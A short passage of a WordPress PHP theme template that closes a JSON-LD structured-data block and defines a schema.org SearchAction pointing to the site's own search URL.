						<?php endif; endforeach; ?>
				  	]
				  	<?php endif; ?>

			 	},
			 	"potentialAction": {
			    	"@type" : "SearchAction",
			    	"target" : "<?php echo esc_url( home_url() ); ?>/?s={search_term}",
			    	"query-input": "required name=search_term"
			    }
			}
			</script>

		<?php }
	}

?>